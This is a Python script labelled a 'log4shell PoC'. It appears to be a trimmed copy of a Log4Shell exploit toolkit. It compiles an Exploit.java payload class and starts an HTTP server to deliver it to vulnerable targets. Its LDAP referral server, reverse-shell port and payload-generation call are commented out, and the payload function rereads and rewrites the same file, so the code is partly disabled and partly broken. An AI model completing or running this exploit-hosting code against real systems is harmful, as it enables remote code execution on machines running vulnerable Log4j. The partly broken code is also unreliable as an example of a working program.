#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()

def generate_payload(userip: str, lport: int) -> None:
    # writing the exploit to Exploit.java file
    with open('Exploit.java', 'r') as file :
        program = file.read()
        p = Path("Exploit.java")
        try:
            p.write_text(program)
            subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
        except OSError as e:
            print(Fore.RED + f'[-] Something went wrong {e}')
            raise e
        else:
            print(Fore.GREEN + '[+] Exploit java class created success')

def payload(webport: int) -> None: #, lport: int) -> None:
    #generate_payload(userip, lport)
    print(Fore.GREEN + '[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    #t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    #t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def main() -> None:
    init(autoreset=True)

    parser = argparse.ArgumentParser(description='log4shell PoC')
   # parser.add_argument('--userip',
    #                    metavar='userip',
     #                   type=str,
      #                  default='localhost',
       #                 help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')
    #parser.add_argument('--lport',
     #                   metavar='lport',
      #                  type=int,
       #                 default='9001',
        #                help='Netcat Port')

    args = parser.parse_args()

    try:
        payload(args.webport) # args.lport)
    except KeyboardInterrupt:
        print(Fore.RED + "user interrupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()